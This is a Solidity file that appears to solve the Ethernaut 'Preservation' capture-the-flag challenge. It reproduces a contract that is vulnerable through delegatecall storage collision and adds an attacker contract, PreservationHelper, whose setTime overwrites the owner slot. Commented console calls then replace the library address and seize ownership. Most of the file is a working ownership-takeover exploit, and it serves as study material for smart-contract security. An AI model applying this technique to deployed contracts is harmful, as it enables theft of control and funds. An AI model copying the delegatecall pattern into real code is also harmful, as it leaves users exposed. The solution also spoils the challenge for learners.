// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    // timestamp should be PreservationHelper (attacker) address
    function setFirstTime(uint256 _timeStamp) public {
        (bool success, ) = timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        require(success, "setFirstTime called");
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        (bool success, ) = timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        require(success, "setSecondTime called");
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}


// await contract.setFirstTime('0xf065d987b5D86418Ca32cC333dF8578c81CaF425'); // 0xf065d987b5D86418Ca32cC333dF8578c81CaF425 == PreservationHelper contract address
// await contract.setFirstTime(player);

contract PreservationHelper {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
